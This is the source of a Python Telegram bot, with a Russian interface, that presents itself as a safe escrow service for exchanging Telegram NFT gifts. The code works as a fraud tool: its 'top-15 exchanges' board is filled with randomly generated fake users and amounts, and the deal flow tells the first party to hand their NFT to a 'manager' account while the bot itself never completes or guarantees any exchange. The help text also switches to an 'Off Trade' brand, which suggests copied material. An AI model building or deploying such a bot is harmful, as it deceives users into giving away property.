import os
import requests
import time
import uuid
import random
from datetime import datetime

TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
SUPPORT = os.getenv('SUPPORT_USERNAME')
MANAGER = os.getenv('MANAGER_USERNAME')
BOT_USERNAME = os.getenv('BOT_USERNAME')

if not TOKEN or not ADMIN_ID or not SUPPORT or not MANAGER or not BOT_USERNAME:
    raise ValueError("Не все переменные окружения заданы!")

deals = {}
top_deals = []
users = {}
banned_users = set()
user_states = {}
user_temp = {}
processing_callbacks = set()

settings = {
    "min_amount": 100,
    "max_amount": 300,
    "banner_photo": None,
    "banner_text": "👋 Приветствуем в проекте «Gift Exchangers».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
}

def tg_request(method, data):
    url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Ошибка {method}: {e}")
        return None

def answer_callback(callback_id, text=None):
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
    tg_request("answerCallbackQuery", data)

def mask_username(username):
    username = username.lstrip('@')
    if len(username) <= 2:
        return '@' + username[0] + '***'
    return '@' + username[:2] + '***' + username[-1]

def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Создать сделку"}],
            [{"text": "❓ Как происходит сделка"}, {"text": "ℹ️ Информация"}],
            [{"text": "📞 Техподдержка"}, {"text": "🏆 Топ-15 обменов"}]
        ],
        "resize_keyboard": True
    }

def admin_inline_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "Статистика", "callback_data": "admin_stats"}],
            [{"text": "Рассылка", "callback_data": "admin_broadcast"}],
            [{"text": "Бан", "callback_data": "admin_ban"}],
            [{"text": "Разбан", "callback_data": "admin_unban"}],
            [{"text": "Баннер (фото)", "callback_data": "admin_banner"}],
            [{"text": "Лимиты", "callback_data": "admin_limits"}],
            [{"text": "Сделки", "callback_data": "admin_deals"}],
            [{"text": "Обновить топ", "callback_data": "admin_refresh_top"}],
            [{"text": "Закрыть", "callback_data": "admin_close"}]
        ]
    }

def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        data["reply_markup"] = reply_markup
    return tg_request("sendMessage", data)

def send_photo(chat_id, photo_id, caption=None, reply_markup=None, parse_mode="HTML"):
    data = {"chat_id": chat_id, "photo": photo_id, "parse_mode": parse_mode}
    if caption:
        data["caption"] = caption
    if reply_markup:
        data["reply_markup"] = reply_markup
    return tg_request("sendPhoto", data)

def send_inline(chat_id, text, buttons, parse_mode="HTML"):
    data = {"chat_id": chat_id, "text": text, "reply_markup": {"inline_keyboard": buttons}, "parse_mode": parse_mode}
    return tg_request("sendMessage", data)

def edit_message(chat_id, message_id, text, inline_keyboard=None, parse_mode="HTML"):
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if inline_keyboard:
        data["reply_markup"] = inline_keyboard
    return tg_request("editMessageText", data)

def delete_message(chat_id, message_id):
    tg_request("deleteMessage", {"chat_id": chat_id, "message_id": message_id})

def send_banner(chat_id):
    if settings["banner_photo"]:
        send_photo(chat_id, settings["banner_photo"], caption=settings["banner_text"], reply_markup=main_keyboard())
    else:
        send_message(chat_id, settings["banner_text"], main_keyboard())

def generate_top_15():
    names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack",
             "Kate", "Leo", "Mia", "Nick", "Olivia", "Paul", "Quinn", "Rita", "Sam", "Tina"]
    random_top = []
    for _ in range(15):
        amount = random.randint(100, 400)
        user1 = random.choice(names) + str(random.randint(10, 99))
        user2 = random.choice(names) + str(random.randint(10, 99))
        random_top.append({'user1': mask_username(user1), 'user2': mask_username(user2), 'amount': amount})
    random_top.sort(key=lambda x: x['amount'], reverse=True)
    return random_top

def handle_message(message):
    global top_deals

    chat_id = message['chat']['id']
    text = message.get('text', '')
    photo = message.get('photo')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')

    if user_id in banned_users:
        send_message(chat_id, "Вы забанены в боте!")
        return

    if user_id not in users:
        users[user_id] = {'username': username, 'first_name': first_name, 'chat_id': chat_id}
    else:
        users[user_id]['chat_id'] = chat_id
        users[user_id]['username'] = username

    # /start ВСЕГДА ПЕРВЫМ - сбрасывает любое состояние
    if text and (text == '/start' or text.startswith('/start ')):
        user_states.pop(user_id, None)
        user_temp.pop(user_id, None)
        if ' deal_' in text:
            deal_id = text.split('deal_')[1].strip()
            if deal_id in deals:
                deal = deals[deal_id]
                status_map = {'waiting': 'Ожидает', 'in_progress': 'В процессе', 'cancelled': 'Отменена', 'completed': 'Завершена'}
                deal_info = (
                    f"<b>СДЕЛКА #{deal_id}</b>\n\n"
                    f"<b>Создатель:</b> @{deal['creator_name']}\n"
                    f"<b>Участник:</b> @{deal['second_user']}\n"
                    f"<b>Сумма:</b> ${deal['amount']}\n"
                    f"<b>Статус:</b> {status_map.get(deal['status'], deal['status'])}\n\n"
                    f"<b>NFT создателя:</b> {deal['my_nft']}\n"
                    f"<b>NFT участника:</b> {deal['his_nft']}"
                )
                if deal['status'] == 'waiting':
                    send_inline(chat_id, deal_info, [[{"text": "Принять сделку", "callback_data": f"accept_{deal_id}"}]])
                else:
                    send_message(chat_id, deal_info)
            else:
                send_message(chat_id, "<b>Сделка не найдена!</b>", main_keyboard())
        else:
            send_banner(chat_id)
        return

    # /admin
    if text == '/admin' and user_id == ADMIN_ID:
        user_states.pop(user_id, None)
        admin_text = (
            f"<b>ПАНЕЛЬ АДМИНИСТРАТОРА</b>\n\n"
            f"<b>Сделок:</b> {len(deals)}\n"
            f"<b>Пользователей:</b> {len(users)}\n"
            f"<b>Забанено:</b> {len(banned_users)}\n"
            f"<b>Лимиты:</b> ${settings['min_amount']} - ${settings['max_amount']}\n"
            f"<b>Баннер:</b> {'фото установлено' if settings['banner_photo'] else 'только текст'}"
        )
        send_inline(chat_id, admin_text, admin_inline_keyboard()['inline_keyboard'])
        return

    # Фото от админа для баннера
    if photo and user_id == ADMIN_ID and user_states.get(user_id) == 'admin_banner':
        del user_states[user_id]
        settings['banner_photo'] = photo[-1]['file_id']
        send_message(chat_id, "<b>Баннер (фото) обновлён!</b>")
        return

    # Сброс при нажатии кнопок меню
    menu_buttons = ["ℹ️ Информация", "❓ Как происходит сделка", "📞 Техподдержка", "🏆 Топ-15 обменов", "📝 Создать сделку"]
    if text in menu_buttons:
        user_states.pop(user_id, None)
        user_temp.pop(user_id, None)

    # Обработка состояний
    if user_id in user_states:
        state = user_states[user_id]

        if state == 'waiting_username':
            second_user = text.replace('@', '').strip()
            if second_user:
                user_temp[user_id]['second_user'] = second_user
                user_states[user_id] = 'waiting_my_nft'
                msg = ('<b>Отлично! Сделка будет создана с @' + second_user + '</b>\n\n'
                       '<b>Важная информация о сделке:</b>\n\n'
                       '• Первая сторона передаёт NFT менеджеру @GiftExchangersManager\n'
                       '• После получения NFT менеджер автоматически подтвердит получение\n'
                       '• Только после подтверждения вторая сторона передаёт свой NFT\n'
                       '• Менеджер мгновенно завершает обмен\n\n'
                       '<b>Введите ссылку на ВАШУ NFT (которую отдаете):</b>')
                send_message(chat_id, msg)
                send_message(chat_id, info_text)
            else:
                send_message(chat_id, "<b>Введите корректный username!</b>")
            return

        if state == 'waiting_my_nft':
            user_temp[user_id]['my_nft'] = text
            user_states[user_id] = 'waiting_his_nft'
            send_message(chat_id, "<b>Введите ссылку на ЕГО NFT (которую получаете):</b>")
            return

        if state == 'waiting_his_nft':
            user_temp[user_id]['his_nft'] = text
            user_states[user_id] = 'waiting_currency'
            currency_buttons = [
                [{'text': '💵 USD', 'callback_data': 'currency_USD'}, {'text': '💶 EUR', 'callback_data': 'currency_EUR'}],
                [{'text': '🪙 RUB', 'callback_data': 'currency_RUB'}, {'text': '🫰 UAH', 'callback_data': 'currency_UAH'}],
                [{'text': '💴 TON', 'callback_data': 'currency_TON'}, {'text': '✏️ Другая', 'callback_data': 'currency_OTHER'}]
            ]
            send_inline(chat_id, "<b>Выберите валюту сделки:</b>", currency_buttons)
            return

        if state == 'waiting_currency_other':
            user_temp[user_id]['currency'] = text.strip()
            user_states[user_id] = 'waiting_amount'
            send_message(chat_id, "<b>Введите сумму сделки:</b>")
            return

        if state == 'waiting_amount':
            try:
                amount_raw = text.strip()
                amount = float(amount_raw.replace(',','.').replace(' ',''))
                if amount <= 0:
                    send_message(chat_id, "<b>Сумма должна быть больше нуля!</b>")
                    return

                deal_id = str(uuid.uuid4())[:8]
                second_user = user_temp[user_id]['second_user']
                my_nft = user_temp[user_id]['my_nft']
                his_nft = user_temp[user_id]['his_nft']

                deals[deal_id] = {
                    'creator_id': user_id, 'creator_name': username, 'second_user': second_user,
                    'my_nft': my_nft, 'his_nft': his_nft, 'amount': amount,
                    'status': 'waiting', 'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"), 'participant_id': None
                }

                deal_text = (
                    f"<b>СДЕЛКА СОЗДАНА!</b>\n\n"
                    f"<b>Номер:</b> <code>{deal_id}</code>\n"
                    f"<b>Создатель:</b> @{username}\n"
                    f"<b>Участник:</b> @{second_user}\n\n"
                    f"<b>Ваша NFT:</b> {my_nft}\n"
                    f"<b>Его NFT:</b> {his_nft}\n"
                    f"<b>Сумма:</b> ${amount}\n\n"
                    f"<b>Ссылка:</b> https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                )
                send_inline(chat_id, deal_text, [[
                    {"text": "Принять сделку", "callback_data": f"accept_{deal_id}"},
                    {"text": "Отменить", "callback_data": f"cancel_{deal_id}"}
                ]])

                for uid, ud in users.items():
                    if ud.get('username', '').lower() == second_user.lower():
                        send_inline(ud['chat_id'],
                            f"<b>ВАС ПРИГЛАСИЛИ К ОБМЕНУ!</b>\n\n<b>@{username} создал сделку с вами!</b>\n\n"
                            f"<b>Номер:</b> <code>{deal_id}</code>\n<b>Сумма:</b> ${amount}\n\n"
                            f"<b>Ссылка:</b> https://t.me/{BOT_USERNAME}?start=deal_{deal_id}",
                            [[{"text": "Принять сделку", "callback_data": f"accept_{deal_id}"}]])
                        break

                del user_states[user_id]
                del user_temp[user_id]
            except ValueError:
                send_message(chat_id, "<b>Введите число!</b>")
            return

        if state == 'admin_broadcast' and user_id == ADMIN_ID:
            del user_states[user_id]
            sent = 0
            for uid, ud in users.items():
                if uid != ADMIN_ID:
                    try:
                        send_message(ud['chat_id'], f"<b>РАССЫЛКА:</b>\n\n{text}")
                        sent += 1
                        time.sleep(0.05)
                    except: pass
            send_message(chat_id, f"<b>Отправлено: {sent} пользователям</b>")
            return

        if state == 'admin_ban' and user_id == ADMIN_ID:
            del user_states[user_id]
            target = text.replace('@','').strip()
            found = False
            for uid, ud in users.items():
                if ud.get('username','').lower() == target.lower() or str(uid) == target:
                    banned_users.add(uid)
                    send_message(chat_id, f"<b>@{target} забанен</b>")
                    found = True
                    break
            if not found:
                send_message(chat_id, "<b>Пользователь не найден</b>")
            return

        if state == 'admin_unban' and user_id == ADMIN_ID:
            del user_states[user_id]
            target = text.replace('@','').strip()
            found = False
            for uid in list(banned_users):
                ud = users.get(uid, {})
                if ud.get('username','').lower() == target.lower() or str(uid) == target:
                    banned_users.remove(uid)
                    send_message(chat_id, f"<b>@{target} разбанен</b>")
                    found = True
                    break
            if not found:
                send_message(chat_id, "<b>Пользователь не найден в банах</b>")
            return

        if state == 'admin_banner' and user_id == ADMIN_ID:
            send_message(chat_id, "<b>Пришлите именно фото (не текст)!</b>")
            return

        if state == 'admin_limits' and user_id == ADMIN_ID:
            del user_states[user_id]
            try:
                parts = text.replace('$','').replace(' ','').split('-')
                if len(parts) == 2:
                    min_val, max_val = int(parts[0]), int(parts[1])
                    if min_val >= max_val:
                        send_message(chat_id, "<b>Минимум должен быть меньше максимума!</b>")
                        return
                    settings['min_amount'] = min_val
                    settings['max_amount'] = max_val
                    send_message(chat_id, f"<b>Лимиты обновлены: ${min_val} - ${max_val}</b>")
                else:
                    send_message(chat_id, "<b>Формат: 100-500</b>")
            except:
                send_message(chat_id, "<b>Ошибка. Формат: 100-500</b>")
            return

    # Кнопки меню
    if text == "ℹ️ Информация":
        info_text = (
            "<b>Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram'a.</b>\n\n"
            "<b>В чем плюсы нашего проекта?</b>\n"
            "• <b>Быстрые, качественные и безопасные обмены!</b>\n"
            "• <b>Техническая поддержка 24/7</b>\n"
            "• <b>Гарантия безопасности каждой сделки</b>\n"
            "• <b>Конфиденциальность данных</b>\n"
            "• <b>Интуитивно понятный интерфейс</b>\n\n"
            "<b>Техническая поддержка:</b> @GiftExchangersManager\n\n"
            "<b>Желаем отличных обменов!</b>"
        )
        send_inline(chat_id, info_text, [
            [{"text": "Как происходит сделка?", "callback_data": "how_deal"}],
            [{"text": "Главное меню", "callback_data": "main_menu"}]
        ])
        return

    if text == "❓ Как происходит сделка":
        deal_text = (
            "<b>Как проходит сделка в Off Trade?</b>\n\n"
            "• <b>Продавец и покупатель обговаривают условия сделки</b>\n"
            "• <b>Один участник создаёт сделку через меню бота - @GiftExchangersBot</b>\n"
            "• <b>Второй участник принимает сделку</b>\n"
            "• <b>После того как 2 человек присоединился, 1 человек передаёт NFT менеджеру - @GiftExchangersManager</b>\n"
            "• <b>После передачи подарка тех поддержка одобрит приход NFT, затем вторая сторона передаёт NFT, и Менеджер передаёт вам NFT</b>\n"
            "• <b>Первая сторона пишет любое сообщение поддержке - @OffTradeSupport и моментально получает подарок.</b>\n"
            "• <b>Сделка завершена успешно!</b>"
        )
        send_inline(chat_id, deal_text, [[{"text": "Главное меню", "callback_data": "main_menu"}]])
        return

    if text == "📞 Техподдержка":
        send_message(chat_id,
            "<b>Техническая поддержка:</b>\n\n"
            "<b>Поддержка:</b> @GiftExchangersSupport\n"
            "<b>Менеджер:</b> @GiftExchangersManager\n\n"
            "<b>Напишите им в личные сообщения!</b>",
            main_keyboard())
        return

    if text == "🏆 Топ-15 обменов":
        if not top_deals:
            top_deals = generate_top_15()
        top_text = "<b>ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            top_text += f"<b>{i}. {deal['user1']} — {deal['user2']} — ${deal['amount']}</b>\n"
        send_message(chat_id, top_text)
        return

    if text == "📝 Создать сделку":
        user_states[user_id] = 'waiting_username'
        user_temp[user_id] = {}
        send_message(chat_id, "<b>Введите @username второго участника сделки:</b>")
        return

def handle_callback(callback):
    global top_deals

    callback_id = callback['id']
    chat_id = callback['message']['chat']['id']
    message_id = callback['message']['message_id']
    data = callback['data']
    user_id = callback['from']['id']
    username = callback['from'].get('username', 'NoUsername')

    cb_key = f"{user_id}_{data}_{message_id}"
    if cb_key in processing_callbacks:
        answer_callback(callback_id, "Подождите...")
        return
    processing_callbacks.add(cb_key)

    try:
        answer_callback(callback_id)

        if data.startswith('accept_'):
            deal_id = data.replace('accept_', '')
            if deal_id not in deals:
                edit_message(chat_id, message_id, "<b>Сделка не найдена!</b>")
                return
            deal = deals[deal_id]
            if deal['status'] != 'waiting':
                edit_message(chat_id, message_id, "<b>Сделка уже недоступна!</b>")
                return
            if user_id == deal['creator_id']:
                edit_message(chat_id, message_id, "<b>Нельзя принять свою сделку!</b>")
                return
            if username.lower() != deal['second_user'].lower():
                edit_message(chat_id, message_id, "<b>Эта сделка создана не для вас!</b>")
                return

            deal['participant_id'] = user_id
            deal['participant_name'] = username
            deal['status'] = 'in_progress'

            top_deals.append({'user1': mask_username(deal['creator_name']), 'user2': mask_username(username), 'amount': deal['amount']})
            top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]

            send_message(deal['creator_id'],
                f"<b>Участник принял вашу сделку!</b>\n\nПередайте NFT менеджеру @GiftExchangersManager.")
            edit_message(chat_id, message_id,
                f"<b>Вы приняли сделку #{deal_id}</b>\n\nОжидайте — создатель передаст NFT менеджеру @GiftExchangersManager.")
            return

        if data.startswith('cancel_'):
            deal_id = data.replace('cancel_', '')
            if deal_id in deals:
                if deals[deal_id]['creator_id'] == user_id:
                    if deals[deal_id]['status'] != 'waiting':
                        edit_message(chat_id, message_id, "<b>Сделку нельзя отменить — она уже принята!</b>")
                        return
                    deals[deal_id]['status'] = 'cancelled'
                    edit_message(chat_id, message_id, f"<b>Сделка #{deal_id} отменена</b>")
                else:
                    edit_message(chat_id, message_id, "<b>Только создатель может отменить сделку!</b>")
            return

        if data.startswith('currency_'):
            if user_states.get(user_id) != 'waiting_currency':
                return
            currency_code = data.replace('currency_', '')
            if currency_code == 'OTHER':
                user_states[user_id] = 'waiting_currency_other'
                edit_message(chat_id, message_id, '<b>Введите название вашей валюты (например: BTC, USDT, GEL):</b>')
            else:
                user_temp[user_id]['currency'] = currency_code
                user_states[user_id] = 'waiting_amount'
                edit_message(chat_id, message_id, '<b>Валюта: ' + currency_code + '</b>\n\n<b>Введите сумму сделки:</b>')
            return

        if data == "main_menu":
            delete_message(chat_id, message_id)
            send_banner(chat_id)
            return

        if data == "how_deal":
            deal_text = (
                "<b>Как проходит сделка в Off Trade?</b>\n\n"
                "• <b>Продавец и покупатель обговаривают условия сделки</b>\n"
                "• <b>Один участник создаёт сделку через меню бота - @GiftExchangersBot</b>\n"
                "• <b>Второй участник принимает сделку</b>\n"
                "• <b>После того как 2 человек присоединился, 1 человек передаёт NFT менеджеру - @GiftExchangersManager</b>\n"
                "• <b>После передачи подарка тех поддержка одобрит приход NFT, затем вторая сторона передаёт NFT, и Менеджер передаёт вам NFT</b>\n"
                "• <b>Первая сторона пишет любое сообщение поддержке - @OffTradeSupport и моментально получает подарок.</b>\n"
                "• <b>Сделка завершена успешно!</b>"
            )
            edit_message(chat_id, message_id, deal_text, {"inline_keyboard": [[{"text": "Главное меню", "callback_data": "main_menu"}]]})
            return

        if user_id != ADMIN_ID:
            return

        if data == "admin_stats":
            stats = (
                f"<b>СТАТИСТИКА</b>\n\n"
                f"<b>Всего сделок:</b> {len(deals)}\n"
                f"<b>Ожидают:</b> {sum(1 for d in deals.values() if d['status'] == 'waiting')}\n"
                f"<b>В процессе:</b> {sum(1 for d in deals.values() if d['status'] == 'in_progress')}\n"
                f"<b>Завершено:</b> {sum(1 for d in deals.values() if d['status'] == 'completed')}\n"
                f"<b>Отменено:</b> {sum(1 for d in deals.values() if d['status'] == 'cancelled')}\n"
                f"<b>Пользователей:</b> {len(users)}\n"
                f"<b>Забанено:</b> {len(banned_users)}\n"
                f"<b>Лимиты:</b> ${settings['min_amount']} - ${settings['max_amount']}"
            )
            edit_message(chat_id, message_id, stats, admin_inline_keyboard())
            return

        if data == "admin_broadcast":
            user_states[user_id] = 'admin_broadcast'
            edit_message(chat_id, message_id, "<b>Введите текст рассылки:</b>")
            return

        if data == "admin_ban":
            user_states[user_id] = 'admin_ban'
            edit_message(chat_id, message_id, "<b>Введите @username или ID для бана:</b>")
            return

        if data == "admin_unban":
            user_states[user_id] = 'admin_unban'
            edit_message(chat_id, message_id, "<b>Введите @username или ID для разбана:</b>")
            return

        if data == "admin_banner":
            user_states[user_id] = 'admin_banner'
            edit_message(chat_id, message_id, "<b>Отправьте фото которое станет баннером.\nОно будет показываться при /start и в главном меню.</b>")
            return

        if data == "admin_limits":
            user_states[user_id] = 'admin_limits'
            edit_message(chat_id, message_id, f"<b>Введите лимиты: мин-макс\nНапример: 100-500\n\nТекущие: ${settings['min_amount']} - ${settings['max_amount']}</b>")
            return

        if data == "admin_deals":
            if not deals:
                edit_message(chat_id, message_id, "<b>Нет сделок</b>", admin_inline_keyboard())
                return
            text = "<b>ВСЕ СДЕЛКИ (последние 10):</b>\n\n"
            status_icons = {'waiting': 'Ожидает', 'in_progress': 'В процессе', 'cancelled': 'Отменена', 'completed': 'Завершена'}
            for deal_id, deal in list(deals.items())[-10:]:
                icon = status_icons.get(deal['status'], '?')
                text += f"{icon} <code>{deal_id}</code>: @{deal['creator_name']} — @{deal['second_user']} (${deal['amount']})\n"
            if len(deals) > 10:
                text += f"\n<b>...и еще {len(deals) - 10} сделок</b>"
            edit_message(chat_id, message_id, text, admin_inline_keyboard())
            return

        if data == "admin_refresh_top":
            top_deals = generate_top_15()
            text = "<b>ТОП-15 ОБНОВЛЕН:</b>\n\n"
            for i, deal in enumerate(top_deals[:15], 1):
                text += f"<b>{i}. {deal['user1']} — {deal['user2']} — ${deal['amount']}</b>\n"
            edit_message(chat_id, message_id, text, admin_inline_keyboard())
            return

        if data == "admin_close":
            delete_message(chat_id, message_id)
            send_banner(chat_id)
            return

    finally:
        processing_callbacks.discard(cb_key)

def main():
    global top_deals
    print(f"Bot started! Admin: {ADMIN_ID}")
    top_deals = generate_top_15()
    tg_request("deleteWebhook", {})
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            response = requests.get(url, params={"offset": offset, "timeout": 30}, timeout=35)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for update in data['result']:
                        offset = update['update_id'] + 1
                        if 'message' in update:
                            try: handle_message(update['message'])
                            except Exception as e: print(f"Err msg: {e}")
                        elif 'callback_query' in update:
                            try: handle_callback(update['callback_query'])
                            except Exception as e: print(f"Err cb: {e}")
            time.sleep(0.3)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Loop error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
